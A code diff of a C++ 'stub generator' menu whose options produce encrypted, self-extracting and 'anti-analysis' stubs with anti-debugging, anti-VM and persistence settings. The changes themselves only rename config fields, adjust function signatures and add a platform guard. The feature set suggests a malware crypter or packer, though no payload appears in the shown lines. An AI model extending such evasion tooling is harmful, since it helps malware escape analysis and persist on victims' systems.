@@ -293,12 +293,13 @@ void handleStubChoice(int choice) {
             if (outputPath.empty()) return;
             
             StubConfig config;
-            config.encryptionEnabled = true;
-            config.antiDebug = false;
-            config.antiVM = false;
-            config.persistence = false;
+            config.addEncryption = true;
+            config.addAntiDebug = false;
+            config.addAntiVM = false;
+            config.addPersistence = false;
             
-            if (generator.generateStub(outputPath, config)) {
+            config.outputName = outputPath;
+            if (generator.generateStub(config)) {
                 std::cout << "Basic stub generated: " << outputPath << "\n";
             } else {
                 std::cout << "Error: Failed to generate stub.\n";
@@ -319,12 +320,14 @@ void handleStubChoice(int choice) {
             }
             
             StubConfig config;
-            config.encryptionEnabled = true;
-            config.antiDebug = true;
-            config.antiVM = true;
-            config.persistence = false;
+            config.addEncryption = true;
+            config.addAntiDebug = true;
+            config.addAntiVM = true;
+            config.addPersistence = false;
             
-            if (generator.generateSelfExtractingStub(outputPath, filePath, config)) {
+            config.outputName = outputPath;
+            std::vector<std::string> files = {filePath};
+            if (generator.createSelfExtractingStub(files, config)) {
                 std::cout << "Self-extracting stub generated: " << outputPath << "\n";
             } else {
                 std::cout << "Error: Failed to generate self-extracting stub.\n";
@@ -365,12 +368,13 @@ void handleStubChoice(int choice) {
             if (outputPath.empty()) return;
             
             StubConfig config;
-            config.encryptionEnabled = true;
-            config.antiDebug = true;
-            config.antiVM = true;
-            config.persistence = true;
+            config.addEncryption = true;
+            config.addAntiDebug = true;
+            config.addAntiVM = true;
+            config.addPersistence = true;
             
-            if (generator.generateStub(outputPath, config)) {
+            config.outputName = outputPath;
+            if (generator.generateStub(config)) {
                 std::cout << "Anti-analysis stub generated: " << outputPath << "\n";
             } else {
                 std::cout << "Error: Failed to generate anti-analysis stub.\n";
@@ -410,7 +414,11 @@ void handleDragDropChoice(int choice) {
             
             // For console applications, we'll use a dummy window handle
             // In a real GUI application, you would pass the actual window handle
+#ifdef _WIN32
             HWND consoleWindow = GetConsoleWindow();
+#else
+            void* consoleWindow = nullptr;
+#endif
             
             if (handler->initialize(consoleWindow)) {
                 std::cout << "Drag and drop initialized successfully.\n";
